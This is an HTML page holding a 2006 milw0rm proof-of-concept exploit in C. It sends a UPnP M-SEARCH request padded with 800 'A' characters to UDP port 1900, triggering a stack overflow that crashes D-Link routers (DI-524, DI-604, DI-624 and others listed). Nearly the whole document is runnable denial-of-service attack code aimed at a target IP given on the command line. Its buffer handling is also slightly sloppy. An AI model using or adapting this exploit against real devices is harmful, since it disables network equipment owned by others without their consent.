<html><head><title>D-Link Router UPNP Stack Overflow Denial of Service Exploit (PoC)</title></head><pre>/* routers affected from eEye's advisory. /str0ke
Routers Affected:
DI-524 Rev A
DI-524 Rev C
DI-524 Rev D
DI-604 Rev E
DI-624 Rev C
DI-624 Rev D
DI-784 Rev A
EBR-2310 Rev A
WBR-1310 Rev A
WBR-2310 Rev A
*/

/*
 * D-Link Router UPNP DOS PoC
 * Written By: ub3rst4r aka DiGiTALST*R
 * Tested Against: DI-524 Rev. A
 *
 * A remote stack overflow exists in a range of wired and wireless D-Link 
 * routers. This vulnerability allows an attacker to execute privileged code
 * on an affected device. Although a stack overflow does exist, debugging this 
 * vulnerabilty requires additional external hardware.
 * 
 * NOTE: You might need to try sending this twice, or use 239.255.255.250
 *
 * Credits: eEye Digital Security
 *
 */

#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#pragma comment(lib,&quot;ws2_32&quot;)

int main(int argc, char **argv)
{
    WSADATA wsa;

    char buf[896];
    
    int sockfd;
    struct sockaddr_in serv_addr;

    int ret;
    
    if (argc &lt; 2) {
        printf(&quot;Usage: dlinkdos &lt;router ip&gt;\n&quot;);
        return 0;
    }
    
    WSAStartup(MAKEWORD(1,1), &amp;wsa);

    // the main string
    memcpy(buf, &quot;M-SEARCH &quot;, 9);
    memset(buf+9, 'A', 800);
    memcpy(buf+809, &quot; HTTP/1.1\r\n&quot;, 10);
    
    // extra data
    strcat(buf,
        &quot;Host:239.255.255.250:1900\r\n&quot;
        &quot;ST:upnp:rootdevice\r\n&quot;
        &quot;Man:\&quot;ssdp:discover\&quot;\r\n&quot;
        &quot;MX:3\r\n&quot;
        &quot;\r\n&quot;
        &quot;\r\n&quot;);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(1900);
    serv_addr.sin_addr.s_addr = inet_addr(argv[1]);
    memset(&amp;serv_addr.sin_zero, '\0', 8);
                     
    ret = sendto(sockfd,buf,sizeof(buf),0,(struct sockaddr *)&amp;serv_addr, sizeof(struct sockaddr));
    if (ret &lt;= 0) {
        printf(&quot;failed to send request\n&quot;);
        return 0;
    } 
    
    printf(&quot;request sent!\n&quot;);
    
    WSACleanup();
    
    return 0;
}

// milw0rm.com [2006-07-22]</pre></html>